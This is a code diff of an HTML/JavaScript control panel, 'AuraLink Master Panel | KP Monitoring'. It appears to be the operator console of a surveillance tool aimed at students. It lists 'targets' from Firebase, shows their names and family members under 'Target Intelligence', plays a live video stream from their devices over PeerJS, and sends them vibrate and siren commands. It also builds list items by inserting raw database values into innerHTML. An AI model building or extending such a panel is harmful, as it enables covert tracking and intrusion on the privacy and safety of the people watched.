@@ -2,65 +2,45 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AuraLink Master OS v7.0</title>
+    <title>AuraLink Master Panel | KP Monitoring</title>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background: #020617; color: #f8fafc; font-family: 'Inter', sans-serif; }
-        .session-card { background: #0f172a; border: 1px solid #1e293b; transition: 0.3s; }
-        .session-card:hover { border-color: #3b82f6; background: #1e293b; }
-        .live-stream { aspect-ratio: 9/16; background: #000; border-radius: 20px; overflow: hidden; border: 2px solid #3b82f6; }
-    </style>
 </head>
-<body class="flex h-screen overflow-hidden">
+<body class="bg-slate-900 text-white flex h-screen">
 
-    <!-- Sidebar: Session List -->
+    <!-- Sidebar -->
     <aside class="w-80 border-r border-slate-800 p-6 flex flex-col">
-        <h1 class="text-xl font-black text-blue-500 mb-8 tracking-tighter italic">AURALINK OS</h1>
-        <div class="text-[10px] font-bold text-slate-500 uppercase mb-4">Active Handshakes</div>
-        <div id="sessionList" class="flex-1 overflow-y-auto space-y-3">
-            <!-- Sessions will appear here automatically -->
+        <h1 class="text-xl font-black text-green-500 italic mb-10">PESHAWAR CONTROL</h1>
+        <div id="user-list" class="space-y-4">
+            <!-- Active Users will pop up here -->
         </div>
     </aside>
 
-    <!-- Main Content: Controls & Stream -->
-    <main class="flex-1 p-8 grid grid-cols-12 gap-8 overflow-y-auto">
-        <div class="col-span-4">
-            <div class="live-stream shadow-2xl shadow-blue-900/20">
-                <video id="adminVideo" autoplay playsinline class="w-full h-full"></video>
+    <!-- Monitor -->
+    <main class="flex-1 p-8 grid grid-cols-12 gap-8">
+        <div class="col-span-8">
+            <div class="bg-black rounded-3xl overflow-hidden border-2 border-green-600 aspect-video relative">
+                <video id="master-video" autoplay playsinline class="w-full h-full"></video>
+                <div class="absolute top-4 left-4 bg-red-600 px-3 py-1 rounded-full text-xs font-bold animate-pulse">LIVE NODE</div>
             </div>
-            <button onclick="document.getElementById('adminVideo').requestFullscreen()" class="w-full mt-4 bg-slate-800 py-3 rounded-xl text-xs font-bold">FULL SCREEN VIEW</button>
+            <div class="mt-6 flex gap-4">
+                <button onclick="sendCmd('vibrate')" class="bg-white/10 px-6 py-3 rounded-xl hover:bg-green-600">VIBRATE</button>
+                <button onclick="sendCmd('beep')" class="bg-white/10 px-6 py-3 rounded-xl hover:bg-green-600">PLAY SIREN</button>
+                <button onclick="document.getElementById('master-video').requestFullscreen()" class="bg-white/10 px-6 py-3 rounded-xl ml-auto">FULL SCREEN</button>
+            </div>
         </div>
 
-        <div class="col-span-8 space-y-6">
-            <div class="grid grid-cols-2 gap-6">
-                <div class="bg-slate-900 p-6 rounded-3xl border border-slate-800">
-                    <h3 class="text-xs font-bold text-slate-500 uppercase mb-4">User Identity</h3>
-                    <div class="space-y-2">
-                        <p>Name: <b id="u-name" class="text-blue-400">--</b></p>
-                        <p>Father: <b id="u-father" class="text-slate-300">--</b></p>
-                        <p>Brother: <b id="u-brother" class="text-slate-300">--</b></p>
-                    </div>
-                </div>
-                <div class="bg-slate-900 p-6 rounded-3xl border border-slate-800">
-                    <h3 class="text-xs font-bold text-slate-500 uppercase mb-4">Device Stats</h3>
-                    <div class="space-y-2">
-                        <p>Model: <b id="u-model" class="text-slate-300">--</b></p>
-                        <p>Battery: <b id="u-bat" class="text-green-500">--</b></p>
-                        <p>Status: <b class="text-blue-500 animate-pulse">ENCRYPTED LIVE</b></p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="bg-slate-900 p-6 rounded-3xl border border-slate-800">
-                <h3 class="text-xs font-bold text-slate-500 uppercase mb-4">Remote Command Center</h3>
-                <div class="grid grid-cols-4 gap-4">
-                    <button onclick="sendRemoteCmd('vibrate')" class="bg-white/5 p-4 rounded-2xl hover:bg-blue-600 transition">Vibrate</button>
-                    <button onclick="sendRemoteCmd('beep')" class="bg-white/5 p-4 rounded-2xl hover:bg-blue-600 transition">Siren</button>
-                    <button onclick="sendRemoteCmd('lock')" class="bg-red-900/20 p-4 rounded-2xl text-red-500">Lock</button>
-                    <button onclick="location.reload()" class="bg-white/5 p-4 rounded-2xl">Refresh</button>
+        <div class="col-span-4 space-y-6">
+            <div class="bg-slate-800 p-6 rounded-3xl border border-slate-700">
+                <h3 class="text-xs font-bold text-slate-500 uppercase mb-4">Target Intelligence</h3>
+                <div class="space-y-2 text-sm">
+                    <p>Student: <span id="det-name" class="text-green-400 font-bold">--</span></p>
+                    <p>Father: <span id="det-father">--</span></p>
+                    <p>Brother: <span id="det-brother">--</span></p>
+                    <p>Device: <span id="det-model" class="text-slate-400">--</span></p>
+                    <p>Battery: <span id="det-bat">--</span></p>
                 </div>
             </div>
         </div>
@@ -76,43 +56,42 @@
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const peer = new Peer("AURALINK_MASTER_ADMIN");
+        const peer = new Peer("AURALINK_MASTER_2026");
 
-        let activeSessionId = null;
-
-        // Auto-load Sessions
-        db.ref('sessions').on('value', (snap) => {
-            const list = document.getElementById('sessionList');
-            list.innerHTML = "";
-            snap.forEach((child) => {
-                const data = child.val();
-                const card = document.createElement('div');
-                card.className = "session-card p-4 rounded-2xl cursor-pointer";
-                card.innerHTML = `<div class='text-sm font-bold'>${data.name}</div><div class='text-[10px] text-slate-500'>${data.model}</div>`;
-                card.onclick = () => loadSession(child.key, data);
-                list.appendChild(card);
-            });
-        });
-
-        function loadSession(id, data) {
-            activeSessionId = id;
-            document.getElementById('u-name').innerText = data.name;
-            document.getElementById('u-father').innerText = data.father;
-            document.getElementById('u-brother').innerText = data.brother;
-            document.getElementById('u-model').innerText = data.model;
-            document.getElementById('u-bat').innerText = data.battery;
-        }
+        let activeTarget = null;
 
         peer.on('call', (call) => {
             call.answer();
-            call.on('stream', (stream) => {
-                document.getElementById('adminVideo').srcObject = stream;
+            call.on('stream', (s) => {
+                document.getElementById('master-video').srcObject = s;
             });
         });
 
-        function sendRemoteCmd(act) {
-            if(!activeSessionId) return alert("Select a user first!");
-            db.ref('commands/' + activeSessionId).set({ action: act, time: Date.now() });
+        // Sync Sidebar from Firebase
+        db.ref('sessions').on('value', (snap) => {
+            const list = document.getElementById('user-list');
+            list.innerHTML = "";
+            snap.forEach((child) => {
+                const u = child.val();
+                const btn = document.createElement('div');
+                btn.className = "p-4 bg-slate-800 rounded-2xl cursor-pointer hover:bg-green-900 border border-slate-700";
+                btn.innerHTML = `<div class="font-bold">${u.name || 'Anonymous User'}</div><div class="text-[10px] text-slate-500">${u.id}</div>`;
+                btn.onclick = () => {
+                    activeTarget = u.id;
+                    document.getElementById('det-name').innerText = u.name || 'Waiting for Form...';
+                    document.getElementById('det-father').innerText = u.father || '--';
+                    document.getElementById('det-brother').innerText = u.brother || '--';
+                    document.getElementById('det-model').innerText = u.model;
+                    document.getElementById('det-bat').innerText = u.battery;
+                };
+                list.appendChild(btn);
+            });
+        });
+
+        function sendCmd(act) {
+            if(activeTarget) {
+                db.ref('commands/' + activeTarget).set({ action: act, time: Date.now() });
+            }
         }
     </script>
 </body>
